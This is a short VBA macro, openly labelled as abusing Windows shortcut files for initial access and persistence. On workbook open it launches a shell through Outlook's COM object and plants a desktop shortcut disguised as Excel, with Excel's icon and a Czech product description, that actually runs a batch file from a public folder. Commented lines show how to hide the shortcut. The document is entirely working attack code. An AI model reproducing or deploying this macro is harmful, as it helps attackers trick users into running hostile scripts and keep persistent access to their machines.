' Abusing LNK "Features" for Initial Access and Persistence
Sub Workbook_Open()

    Set objOL = CreateObject("Outlook.Application")
    
    Set wshell = objOL.CreateObject("WScript.Shell")
    Dim path
    path = wshell.SpecialFolders("Desktop") & "/Fake Excel.lnk"
    
    Set shortcut = wshell.CreateShortcut(path)
    shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\xlicons.exe,0"
    shortcut.WindowStyle = 4
    shortcut.TargetPath = "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO.bat"
    
    shortcut.Description = "Umožnuje snadno pracovat s daty, analyzovat je a vizualizovat a výstupy potom sdílet s ostatními."
    shortcut.Save
    
    ' Optional if we want to make the link invisible (prevent user clicks)
    'Set fso = CreateObject("Scripting.FileSystemObject")
    'Set mf = fso.GetFile(path)
    'mf.Attributes = 2

End Sub

